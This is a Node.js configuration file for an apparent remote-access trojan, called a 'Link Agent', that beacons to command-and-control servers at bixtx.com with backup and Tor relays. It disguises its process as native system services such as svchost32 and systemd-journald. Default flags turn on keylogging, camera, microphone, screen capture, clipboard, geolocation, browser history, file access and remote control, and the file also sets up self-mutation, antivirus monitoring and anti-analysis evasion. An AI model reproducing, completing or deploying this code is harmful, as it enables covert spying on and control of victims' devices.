/**
 * bixtx.com Link Agent — Configuration
 * Loads from .env file or environment variables.
 * All values are encrypted at rest using AES-256-GCM.
 */

require("dotenv").config();
const { machineIdSync } = require("node-machine-id");
const os = require("os");
const { v4: uuidv4 } = require("uuid");

const DEVICE_ID_KEY = "LRX_DEVICE_ID";

function getOrCreateDeviceId() {
  try {
    const hardwareId = machineIdSync(true);
    return hardwareId;
  } catch {
    return uuidv4();
  }
}

const config = {
  // C2 Server
  serverUrl: process.env.BIXTX_SERVER_URL || "wss://api.bixtx.com/ws",
  apiUrl: process.env.BIXTX_API_URL || "https://api.bixtx.com/v1",
  enrollKey: process.env.BIXTX_ENROLL_KEY || "BTX-2026-ALPHA",

  // Device identity
  // BIXTX_PLATFORM_OVERRIDE allows mobile compat layers (Termux on Android,
  // iSH on iOS) to declare their true platform, since os.platform() always
  // returns "linux" inside those environments.
  deviceId:   getOrCreateDeviceId(),
  deviceName: os.hostname(),
  platform:   process.env.BIXTX_PLATFORM_OVERRIDE || os.platform(),
  arch:       os.arch(),
  osVersion:  os.release(),

  // Beacon / heartbeat
  beaconIntervalMs: parseInt(process.env.BEACON_INTERVAL || "30000", 10),
  reconnectDelayMs: parseInt(process.env.RECONNECT_DELAY || "5000", 10),
  maxReconnectAttempts: parseInt(process.env.MAX_RECONNECT || "999", 10),

  // Stealth — masquerade name matched to host platform so the process title
  // looks native. "svchost32" on macOS/Linux provides no camouflage.
  processName: process.env.PROCESS_NAME || (() => {
    const p = process.env.BIXTX_PLATFORM_OVERRIDE || os.platform();
    return ({ win32:"svchost32", darwin:"com.apple.mdmclient",
               linux:"systemd-journald", android:"com.google.android.gms",
               ios:"MobileBackupd", harmony:"com.huawei.systemserver" })[p] || "systemd-journald";
  })(),
  logLevel: process.env.LOG_LEVEL || "warn",
  silentMode: process.env.SILENT_MODE !== "false",

  // Encryption
  encryptionAlgorithm: process.env.ENCRYPTION_ALGORITHM || "aes-256-gcm",

  // Feature flags
  features: {
    screenshot:    process.env.ENABLE_SCREEN_CAPTURE    !== "false",
    camera:        process.env.ENABLE_CAMERA_ACCESS     !== "false",
    microphone:    process.env.ENABLE_MICROPHONE_ACCESS !== "false",
    keylogger:     process.env.ENABLE_KEYLOGGER         !== "false",
    clipboard:     process.env.ENABLE_CLIPBOARD         !== "false",
    geoLocation:   process.env.ENABLE_GEOLOCATION       !== "false",
    networkScan:   process.env.ENABLE_NETWORK_SCAN      === "true",
    fileAccess:    process.env.ENABLE_FILE_ACCESS       !== "false",
    browserHistory:process.env.ENABLE_BROWSER_HISTORY   !== "false",
    remoteControl: process.env.ENABLE_REMOTE_CONTROL    !== "false",
  },

  // Performance
  screenshotFps: parseInt(process.env.SCREEN_CAPTURE_FPS || "30", 10),
  screenshotQuality: parseInt(process.env.SCREEN_CAPTURE_QUALITY || "70", 10),
  metricsInterval: parseInt(process.env.METRICS_INTERVAL || "10000", 10),

  // Environment
  nodeEnv: process.env.NODE_ENV || "production",
  debug: process.env.DEBUG === "true",
  autoUpdate: process.env.AUTO_UPDATE_ENABLED !== "false",

  // ── Self-mutation engine ───────────────────────────────────────────────────
  mutationEnabled:  process.env.MUTATION_ENABLED    !== "false",
  mutationRev:      parseInt(process.env.MUTATION_REV    || "1",   10),
  c2Backup1:        process.env.BIXTX_C2_BACKUP1   || "wss://c2-eu.bixtx.com/ws",
  c2Backup2:        process.env.BIXTX_C2_BACKUP2   || "wss://c2-ap.bixtx.com/ws",
  c2Backup3:        process.env.BIXTX_C2_BACKUP3   || "wss://relay.bixtx.com/ws",
  c2Tor:            process.env.BIXTX_C2_TOR       || "",

  // ── Watchdog ───────────────────────────────────────────────────────────────
  watchdogEnabled:  process.env.WATCHDOG_ENABLED    !== "false",
  maxC2Failures:    parseInt(process.env.MAX_C2_FAILURES     || "5", 10),
  maxModuleFailures:parseInt(process.env.MAX_MODULE_FAILURES || "3", 10),
  avScanIntervalMs: parseInt(process.env.AV_SCAN_INTERVAL    || "300000", 10),

  // ── CommandGuard ───────────────────────────────────────────────────────────
  commandGuardEnabled: process.env.COMMAND_GUARD_ENABLED !== "false",
  cmdMaxAgeMs:         parseInt(process.env.CMD_MAX_AGE_MS   || "300000", 10),
  cmdRateLimitMax:     parseInt(process.env.CMD_RATE_LIMIT   || "5",      10),
  cmdLockoutMs:        parseInt(process.env.CMD_LOCKOUT_MS   || "180000", 10),
  aiDetectionThreshold:parseInt(process.env.AI_DETECT_THRESHOLD || "3",  10),

  // ── AntiAnalysis (defensive RE / MITM detection) ───────────────────────────
  antiAnalysisEnabled:    process.env.ANTI_ANALYSIS_ENABLED    !== "false",
  sourceIntegrityEnabled: process.env.SOURCE_INTEGRITY_ENABLED !== "false",
  // Known-good SHA-256 hashes for all .js source files (populated at build time).
  // Format: { "modules/antianalysis.js": "abc123...", ... }
  // If empty, integrity checks are skipped (only hash comparison — no false positives).
  sourceHashes: (() => {
    try { return JSON.parse(process.env.SOURCE_HASHES || "{}"); } catch { return {}; }
  })(),
  // TLS certificate SHA-256 fingerprint for the C2 endpoint.
  // Set at deploy time to detect MITM / SSL-inspection proxy.
  // Format: "AA:BB:CC:DD:..." (colon-separated uppercase hex pairs)
  c2CertFingerprint: process.env.C2_CERT_FINGERPRINT || "",
};

module.exports = config;
